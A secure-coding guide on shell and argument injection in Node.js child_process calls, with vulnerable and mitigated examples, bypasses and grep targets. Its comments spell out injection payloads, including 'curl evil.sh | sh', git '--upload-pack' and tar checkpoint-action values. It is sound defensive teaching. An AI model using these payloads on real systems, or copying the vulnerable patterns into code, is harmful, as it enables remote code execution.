**Mitigation options**

| Option | When it fits | Docs |
|---|---|---|
| Use a library instead of a process | Best option: git, images, archives, PDFs all have libraries | [isomorphic-git](https://isomorphic-git.org/), [sharp](https://sharp.pixelplumbing.com/), [tar](https://www.npmjs.com/package/tar) |
| `execFile` / `spawn` with an argument array (no `shell`) | You must run a program; stops shell injection only | [`child_process`](https://nodejs.org/api/child_process.html) |
| Allowlist pattern that can't start with `-` | Every input that becomes an argument | [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) |
| `--` / `--end-of-options` before input | The tool honours the end-of-options marker | [git-cli: `--end-of-options`](https://git-scm.com/docs/gitcli) |

**Vulnerable — shell string built from input**

```js
const { exec } = require('node:child_process')

app.post('/thumbnail', (req, res) => {
  exec(`convert uploads/${req.body.file} -resize 200x200 thumbs/out.png`, (err) => {
    res.sendStatus(err ? 500 : 204)          // file = "a.png; curl evil.sh | sh"
  })
})
```

`exec` hands the whole string to `/bin/sh`, so `;`, `|`, `$(…)` and backticks
in `file` start new commands.

**Vulnerable — "safe" argument array, dangerous option (argument injection)**

```js
const { execFile } = require('node:child_process')

// "import a repository": list the remote's branches before cloning it
execFile('git', ['ls-remote', req.body.url], cb)
// url = "--upload-pack=touch /tmp/pwned"
```

There is no shell here, so the metacharacter payloads do nothing. But git reads
the value as an option, and `--upload-pack` names a program for git to run
for a local or SSH remote. The same shape works on `tar`
(`--checkpoint-action=exec=…`), `ssh` (`-oProxyCommand=…`), `rsync` (`-e …`),
`curl` (`-o /path`, `-K file`) and `find` (`-exec`).

**Vulnerable — the value is last, but options are still parsed**

```js
execFile('tar', ['-czf', 'backup.tgz', ...req.body.paths])
// paths = [".", "--checkpoint=1", "--checkpoint-action=exec=sh x.sh"]
```

GNU tools reorder their arguments, so an option after a positional argument
still counts as an option.

**Vulnerable — `shell: true` hidden in the options**

```js
spawn('git', ['log', req.query.ref], { shell: true })   // joins the array into a shell string
```

**Mitigated — argument array, allowlist, and an end-of-options marker**

```js
const REF = /^[A-Za-z0-9][A-Za-z0-9._/-]{0,254}$/

function fetchBranch(workDir, branch, cb) {
  if (!REF.test(branch) || branch.includes('..')) return cb(new Error('invalid branch'))
  execFile('git', ['-C', workDir, 'fetch', '--end-of-options', 'origin', `refs/heads/${branch}`], {
    env: { PATH: process.env.PATH },          // no app secrets in the child
    timeout: 60_000,
  }, cb)
}
```

Three layers, each enough on its own for this call:
- The pattern can't start with `-`.
- `--end-of-options` makes git treat everything after it as an argument.
- The `refs/heads/` prefix means the value can never look like an option.

Docs: [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) · [gitcli](https://git-scm.com/docs/gitcli)

**Mitigated — no process at all**

```js
const git = require('isomorphic-git')
await git.fetch({ fs, http, dir: workDir, remote: 'origin', ref: branch, singleBranch: true })
```

Docs: [isomorphic-git `fetch`](https://isomorphic-git.org/docs/en/fetch)

**Bypasses to check**

- An allowlist that only blocks shell metacharacters, such as `[^;&|`$]`, still allows `-` and `=`. That is enough for argument injection.
- **Check then change:** a value is validated, then trimmed or decoded, or read back from the database. The value used is not the one that was checked.
- **A missing validation in one sibling:** one of two similar arguments is validated and the other isn't, or one route validates and another reaches the same helper without it.
- URLs passed to `git clone` or `git ls-remote`: a URL can be an option (`--upload-pack=…`), and `ext::` or `file://` URLs run or read locally. Allow `https://` only, and pass `-c protocol.allow=never -c protocol.https.allow=always`.
- `--` placed **after** the value instead of before it, or a tool that ignores `--`, such as some `sendmail` builds.
- Values that become options through splitting: a JSON array body, `split(' ')`, or `shell-quote` parsing input into several arguments.
- `npx`, `yarn` and `node -e` with input, and environment variables built from input, such as `GIT_SSH_COMMAND` and `LD_PRELOAD`.

**What to grep for**

- `child_process`, `exec(`, `execSync(`, `spawn(`, `execFile(`, `fork(`, `shell: true`
- `execa(`, `shelljs`, `simple-git`, `.raw(`, `zx` (template-tag commands)
- `git`, `tar`, `ssh`, `rsync`, `curl`, `ffmpeg`, `convert`, `--`, `--end-of-options`
